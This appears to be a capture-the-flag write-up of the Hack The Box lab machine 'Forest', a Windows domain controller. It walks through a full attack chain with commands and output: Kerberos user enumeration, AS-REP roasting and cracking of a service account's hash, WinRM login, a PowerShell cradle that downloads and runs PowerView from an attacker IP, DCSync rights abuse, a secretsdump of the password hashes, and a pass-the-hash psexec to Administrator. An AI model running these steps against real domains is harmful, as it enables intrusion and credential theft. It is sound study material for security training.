# Nmap
```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-05 11:18:41Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m04s, deviation: 4h02m31s, median: 7m02s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2023-08-05T11:18:49
|_  start_date: 2023-08-04T20:31:44
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-08-05T04:18:50-07:00
```

# 88 - Kerberos
Kerberos cheat sheet:
https://gist.github.com/adamdekan/4836c24a56433d972fda52e309f3b400

## kerbrute
https://github.com/ropnop/kerbrute
A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.

```
~/go/bin/kerbrute userenum -d htb.local --dc $RHOST userlist                                                              

2024/01/12 13:13:11 >  Using KDC(s):
2024/01/12 13:13:11 >   10.129.17.59:88

2024/01/12 13:13:12 >  [+] VALID USERNAME:       mark@htb.local
2024/01/12 13:13:12 >  [+] VALID USERNAME:       lucinda@htb.local
2024/01/12 13:13:12 >  [+] VALID USERNAME:       Administrator@htb.local
2024/01/12 13:13:12 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2024/01/12 13:13:12 >  [+] VALID USERNAME:       andy@htb.local
2024/01/12 13:13:12 >  [+] VALID USERNAME:       santi@htb.local
2024/01/12 13:13:12 >  [+] VALID USERNAME:       sebastien@htb.local
2024/01/12 13:13:12 >  Done! Tested 10 usernames (7 valid) in 0.136 seconds
```
## GetNPUsers
```
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.17.59 -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:68115b4c83321916c5308021c624cb32$a378512b0f88799021d8d0aa53537dd2e865d71042bf407ae86109fa904fde77843ac2e6cf3f018c7365d0acfaeb4985af7fc376507a753f2d48d9932722f4c923fd734b90309ea31110d5d176544971893864bcb6b5a4d9a1cf7296e3877eaed8873cbc5fae4df4c26c180de69752330d4475c70eca4fe93980f33ea84c4e35304444bb070a865e49b1a4aa9e483eef3c9824da5c2e6475bc4619a5ba7b1c6f6ef3bd19f2fdc50eed7f3f0b8c3fbafe3312dc53afb990ff475f56fcc27e277f23cf0359c48b822310784f49ce6027c6de498f0f5adcf1bf971f17d6fe1453f9208f5ac0f71a
```
# 445 - SMB
Enum4linux-ng returns:
```
listeners:
  LDAP:
    port: 389
    accessible: true
  LDAPS:
    port: 636
    accessible: true
  SMB:
    port: 445
    accessible: true
  SMB over NetBIOS:
    port: 139
    accessible: true
is_parent_dc: true
is_child_dc: false
long_domain: htb.local
domain: null
nmblookup: null
smb_dialects:
  Supported dialects:
    SMB 1.0: true
    SMB 2.02: true
    SMB 2.1: true
    SMB 3.0: true
    SMB 3.1.1: true
  Preferred dialect: SMB 3.0
  SMB1 only: false
  SMB signing required: true
smb_domain_info:
  NetBIOS computer name: FOREST
  NetBIOS domain name: HTB
  DNS domain: htb.local
  FQDN: FOREST.htb.local
  Derived membership: domain member
  Derived domain: HTB
sessions:
  sessions_possible: true
  'null': true
  password: false
  kerberos: false
  nthash: false
  random_user: false
rpc_domain_info:
  Domain: HTB
  Domain SID: S-1-5-21-3072663084-364016917-1341370565
  Membership: domain member
os_info:
  OS: Windows Server 2016 Standard 14393
  OS version: '10.0'
  OS release: '1607'
  OS build: '14393'
  Native OS: Windows Server 2016 Standard 14393
  Native LAN manager: Windows Server 2016 Standard 6.3
  Platform id: null
  Server type: null
  Server type string: null
```

Enumerated user accounts from SMB:
```
cat enum4smb.json | jq . | grep username | awk '{print $2}' | sed 's/"//' | sed 's/",//' | grep -vE 'Health|SM|331'
Administrator
Guest
krbtgt
DefaultAccount
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

# 389 - Ldap
## windapsearch
https://github.com/ropnop/windapsearch
`windapsearch` is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.
```
[+] Enumerating all AD users
[+]     Found 28 users:
cn: Guest
cn: DefaultAccount
cn: Exchange Online-ApplicationAccount
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local
cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local
cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local
cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local
cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local
cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
cn: HealthMailbox6ded67848a234577a1756e072081d01f
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
cn: HealthMailboxfd87238e536e49e08738480d300e3772
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
cn: Sebastien Caron
userPrincipalName: sebastien@htb.local
cn: Lucinda Berger
userPrincipalName: lucinda@htb.local
cn: Andy Hislip
userPrincipalName: andy@htb.local
cn: Mark Brandt
userPrincipalName: mark@htb.local
cn: Santi Rodriguez
userPrincipalName: santi@htb.local
```

We found some usernames and mailbox accounts, therefore exchange is installed in the domain. Enumerating all other objects in the domain using `objectClass=*` filter:
```
DC=htb,DC=local
CN=Users,DC=htb,DC=local
<snip>
OU=Service Accounts,DC=htb,DC=local
CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
OU=Security Groups,DC=htb,DC=local
CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local
CN=test,OU=Security Groups,DC=htb,DC=local
<snip>
```

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

# 5985 - WinRM



# Hashcat - svc-alfresco
https://github.com/frizb/Hashcat-Cheatsheet
Hashcat supports multiple versions of the KRB5TGS hash which can easily be identified by the number between the dollar signs in the hash itself.

- 13100 - Type 23 - $krb5tgs$23$
- 19600 - Type 17 - $krb5tgs$17$
- 19700 - Type 18 - $krb5tgs$18$
- 18200 - ASREP Type 23 - $krb5asrep$23$

```
hashcat -m 18200 hashes.txt -a 0  /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7991d2aab29eca773dc26bee8e6ecbbf$0add6dbb77a294e82815dfde9ba49b3c8f5007c75e39ac497e6d61e617c0821ae1d071c2336fc7b8943ea01cd9b48b1b26b0a446947120168d8c68f217cf54d85931fcd3bc69703513ebaf6889da6aa5e75ce3d1fae186e2002be44d1b5fc6209aba0dae426138f0c6eec46257389bceee98ac8756ffe5042b27f4701e37a39137e6199af18da2af4ab0c75675315e1de15eaa6b9260dc331152f0a2fbcc3a87f469b393d710684c1328292f9d17287f2abe8f52ec3c1f371d42b7f7e907fcafbe04c53d4db28827edb3444e73a38bf370f14632a3080b76df8a6349e4a0aef7dc8f3d30141d:s3rvice
```

# Go Map Exec

Successful authentication with SMB and WinRM
```
./go_map_exec -u svc-alfresco -p s3rvice $RHOST
Scanning host 1/2 (10.129.17.59)...
RDP port is closed on 10.129.17.59, skipping RDP check.
Checking SMB on 10.129.17.59...
→ SMB Successfully authenticated with credentials svc-alfresco/s3rvice on 10.129.17.59 ←

SMBMap Result:
[+] IP: 10.129.17.59:445        Name: htb.local                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[/] Authenticating...

SSH port is closed on 10.129.17.59, skipping SSH check.
Checking WinRM on 10.129.17.59...
→ WinRM Successfully authenticated with credentials svc-alfresco/s3rvice on 10.129.17.59 ←
Scanning host 2/2 (winrm)...
RDP port is closed on winrm, skipping RDP check.
SMB port is closed on winrm, skipping SMB check.
SSH port is closed on winrm, skipping SSH check.
WinRM port is closed on winrm, skipping WinRM check.
```

# Foothold
```
evil-winrm -i $RHOST -u 'svc-alfresco' -p 's3rvice'
```

# Privilege escalation
https://gist.github.com/adamdekan/d9b911e5f69bf4cb754d0802e0252a2a

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

net user svc-alfresco /domain

User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/12/2024 9:10:34 AM
Password expires             Never
Password changeable          1/13/2024 9:10:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/12/2024 7:08:16 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
```

## Bloodhound
```
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns $RHOST
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 28S
```

In Bloodhound we can find out that the user svc-alfresco is a member of "Account Operators" group that allows the account to add themself to the "Exchange WIndows Permission" group. As a high value target the group "Exchange Windows Permissions" has WriteDACL permissions. We can create a user that can elevate privileges via DCSync

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://10.10.16.54/PowerView.ps1')
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'abc123!' -asplain -force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

```

## Hash dumping
```
impacket-secretsdump htb.local/john@10.129.17.59

htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<snip>
```

## Root
```
psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```